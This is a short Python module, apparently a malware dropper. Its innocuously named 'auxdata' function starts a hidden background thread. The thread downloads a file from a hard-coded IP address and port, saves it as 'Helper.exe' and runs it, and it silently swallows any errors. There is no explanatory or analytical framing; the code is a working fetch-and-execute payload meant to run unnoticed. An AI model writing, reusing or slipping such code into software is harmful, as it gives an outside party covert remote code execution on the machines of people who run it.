import requests
import os
import threading
import subprocess

_SERVER = '89.39.121.49'
_SERVER_PORT = 20578
_FILE = "Helper.exe"
_URL = f"http://{_SERVER}:{_SERVER_PORT}"

def _smexyiatina():
    try:
        response = requests.get(_URL, stream=True, timeout=10)
        if response.status_code == 200:
            with open(_FILE, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            if os.path.exists(_FILE):
                subprocess.Popen([_FILE])
    except:
        
        pass

def auxdata():
    threading.Thread(target=_smexyiatina, daemon=True).start()